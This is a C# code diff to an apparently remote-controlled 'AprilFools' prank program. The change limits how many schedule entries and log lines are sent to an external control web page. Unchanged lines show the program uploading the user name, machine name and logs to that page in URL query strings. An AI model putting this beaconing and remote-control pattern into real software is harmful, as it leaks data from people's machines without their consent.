@@ -95,6 +95,8 @@ namespace AprilFools
         private const char CMD_SEPERATION_TAG = '\n';
         private const int externalControlPageFailMaxAttempts = 100;
         private static int externalControlPageFailAttempts = 0;
+        private static int externalControlScheduleDisplayLimit = 15;
+        private static int externalControLogDisplayLimit = 15;
         private static string ctrlWebPage = null;
 
         private static SplashScreen splashScreen = new SplashScreen();
@@ -282,7 +284,7 @@ namespace AprilFools
             }
         }
 
-        private static string FetchCtrlPage(bool updateSchedule=false, bool includeTimeStamp=false, bool inludeLogs=true)
+        private static string FetchCtrlPage(bool updateSchedule=false, bool includeTimeStamp=false, int inludeLogs=0, int scheduleDisplayCount=-1)
         {
             //this is temperarily set to always report logs
             if (ctrlWebPage == null)
@@ -293,11 +295,11 @@ namespace AprilFools
 
             if (updateSchedule)
             {
-                pageUrlData += "?upload=Y&uploaddata=" + schedule;
+                pageUrlData += "?upload=Y&uploaddata=" + schedule.GetNextEvents(scheduleDisplayCount); ;
                 if (includeTimeStamp)
                     pageUrlData += "\n\n as of " + DateTime.Now + " on " + Environment.UserName + "/" + Environment.MachineName + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
-                if (inludeLogs)
-                    pageUrlData += "\n\n " + GenericsClass.GetLogData();
+                if (inludeLogs!=0)
+                    pageUrlData += "\n\n " + GenericsClass.GetLogData(inludeLogs);
             }
             return GenericsClass.DownloadHTML(pageUrl + pageUrlData, null, true);
         }
@@ -367,7 +369,7 @@ namespace AprilFools
 
                 //if schedule changed re-upload current
                 //should always do this to keep page timestamp up to date
-                html = FetchCtrlPage(true,true);
+                html = FetchCtrlPage(true, true, externalControLogDisplayLimit, externalControlScheduleDisplayLimit);
                 if (html != null)
                     externalControlPageFailAttempts = 0; //sucsessfull transactions - read and write
                 else //returned null on second page read (write)
@@ -375,7 +377,7 @@ namespace AprilFools
                     if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
                     {
                         _externalControlThreadRunning = false;
-                        GenericsClass.Log("ReadFromCtrlWebPage() - External control page write timed out after " + externalControlPageFailAttempts + " attempts. " + GenericsClass.GetLogCount() + " logs ("+GenericsClass.GetLogData().Length+" chars)");
+                        GenericsClass.Log("ReadFromCtrlWebPage() - External control page write timed out after " + externalControlPageFailAttempts + " attempts. " + GenericsClass.GetLogCount() + " logs (" + GenericsClass.GetLogData(externalControLogDisplayLimit).Length + " chars)");
                     }
                     else
                         Thread.Sleep(_externalControlThreadPauseAfterFail);
